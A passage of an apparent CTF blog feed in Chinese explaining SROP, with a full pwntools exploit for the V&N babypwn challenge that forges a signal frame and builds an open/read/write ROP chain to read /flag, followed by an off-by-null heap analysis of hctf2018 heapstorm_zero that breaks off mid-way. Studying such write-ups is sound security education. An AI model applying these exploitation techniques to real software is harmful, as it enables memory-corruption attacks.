      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T10:01:55.223Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a 